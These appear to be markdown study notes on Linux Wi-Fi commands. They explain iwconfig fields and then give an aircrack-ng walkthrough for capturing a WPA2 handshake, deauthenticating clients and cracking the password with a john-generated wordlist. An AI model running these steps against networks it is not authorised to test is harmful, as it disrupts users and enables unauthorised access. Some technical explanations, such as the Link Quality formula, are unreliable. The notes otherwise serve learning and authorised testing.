# This is a file explaining how wireless networking commands work on Unix systems.



The command `iwconfig` can be used to display information about the status of the wireless adapter (network card) and its connection mode.
This command extracts the information from the file `/proc/net/wireless`.
A typical output looks like this:

```bash
>>>iwconfig

lo        no wireless extensions.

eth0  no wireless extensions.

wlan1  IEEE 802.11  ESSID:"my_AP_name"  
          Mode:Managed  Frequency:5.5 GHz  Access Point: 62:E9:31:69:94:A0   
          Bit Rate=324.2 Mb/s   Tx-Power=22 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
          Link Quality=48/70  Signal level=-62 dBm  
          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
          Tx excessive retries:0  Invalid misc:46   Missed beacon:0

```

### The following information are provided:

1. **ESSID** - the network name / Domain ID (not an identifier)
    - used to identify which devices are under the same network (they share the same ESSID)
2. **Mode** - under which mode the network card is currently working. The available modes are:
    - Ad-Hoc: a peer-to-peer connection between 2 or more devices
    - Managed: the network card is connected to an Access Point (AP)
    - Master: the network card is acting as an Access Point (AP)
    - Repeater: the network card is acting as a repeater (it receives and forwards packets)
    - Secondary: the network card is acting as a backup to another network card
    - Monitor: the network card is in monitor mode (it can capture all packets in the air)
    - Auto: the network card chooses the best mode automatically
3. **Frequency** - the operating frequency of the network card. Values below 1000 indicate a channel.
 (bandwitdh is split into channels to distrubute AP traffic load) Values above 1000 are frequency in Hz.
4. **Access Point (AP)** - address that specifies the network cell identity (unlike ESSID, its unique for each cell). This value is returned
as an identifier when scanning the networks
5. **Bit Rate** - bitrate for the transmission of all data, including overhead. Specifies the speed of the connection. (in bit/s)
6. **Tx-Power** - trasmit power in dBm (defined as: [ P ] = [ 30 + 10log(W) ] )
7. **Retry limit** - Specifies the number of times a packet will be resent in case the packet is not received at the receiver. There are 2 types of packets:
    - short packets: shorter version of a packet which have reduced payload
    - long packets: usual packets
8. **RTS thr** - adds a [Handshake](Four_Way_Handshake.md) to each packet increasing the overhead.
9. **Fragment thr** - splits the packets into smaller fragments which are sent separately. This increases the overhead but reduces the chance of packet loss.
10. **Power Management** - specifies if the power management is enabled or disabled. If enabled, the network card will go into sleep mode when not in use.
11. **Link Quality** - the quality of the connection. The higher the value, the better the connection. The value is calculated as follows:
    - Link Quality = (Signal level / Noise level) * 100
    - Signal level: the strength of the signal in dBm
    - Noise level: the strength of the noise in dBm
12. **Signal level** - the strength of the signal in dBm. The higher the value, the better the connection.

The command `airmon-ng` can be used to display information about the wireless adapters and their status.
A typical output looks like this:

```bash
>>>airmon-ng

PHY	Interface	Driver		Chipset
phy0	wlan1		ath9k		Qualcomm Atheros AR9485 Wireless Network Adapter (rev 01)
phy1	wlan0		ath9k_htc	Qualcomm Atheros AR9271 802.11n
```

The command `airodump-ng` can be used to display information about the wireless networks in the area.
A typical output looks like this:

```bash
>>>airodump-ng wlan1

CH  1 ][ Elapsed: 1 min ][ 2017-12-10 17:02 ][ fixed channel wlan1: -1
                                                                                                 
 BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                
 62:E9:31:69:94:A0  -62       10        0    0   5  270  WPA2 CCMP   PSK  my_AP_name
```



Start the attack by executing:
```bash
sudo airmon-ng check kill 
```
This will kill all processes (for example of Network Manager) that might interfere with the attack.
To List all available networks use:

```bash
sudo airodump-ng wlan0
```
This will force the mode **Monitor** on the network adapter. To start caputring packets on a specific ESSID use:

```bash
sudo airodump-ng -w output -N <ESSID> wlan0 
```

To increase chances of getting a handshake, deauthenticate a client from the network. Here, there will be 20 deauth packets sent.
Make sure to run this command in a separate terminal window to keep the capture running.
```bash
sudo aireplay-ng -0 20 -e <ESSID> wlan0
```

Open the file containing the [Handshake](Four_Way_Handshake.md) generated by airodump-ng with the command:
```bash
aircrack-ng  *<file_name>.cap -e <ESSID>
```

To crack the password, give aircrack-ng a wordlist containing possible passwords:
```bash
john -incremental -stdout | aircrack-ng output*.cap -w - -e <ESSID>
```

The network card is still in **Monitor** mode. To set it back to **Managed** mode in order to connect to a network, use:
```bash
sudo ip link set wlan0 down
sudo iw wlan0 set type managed
sudo ip link set wlan0 up
```

Apart from that, start the NetworkManager service again:
```bash
sudo service NetworkManager restart
```

To connect to a network from the command line, use:
```bash
sudo nmtui-connect <ESSID>
```





